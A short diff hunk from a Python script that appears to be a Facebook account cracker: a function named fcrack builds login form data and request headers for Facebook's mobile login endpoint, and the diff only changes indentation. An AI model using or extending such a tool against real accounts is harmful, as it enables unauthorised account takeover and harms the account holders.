@@ -528,7 +528,7 @@ def fcrack(uid,pwx,tl):
 	"email":uid,
 	"pass":ps,
 	"login":"Log In"}
-	header_freefb = {'authority': 'p.facebook.com',
+			header_freefb = {'authority': 'p.facebook.com',
 	'method': 'GET',
     'path': '/login/device-based/login/async/',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
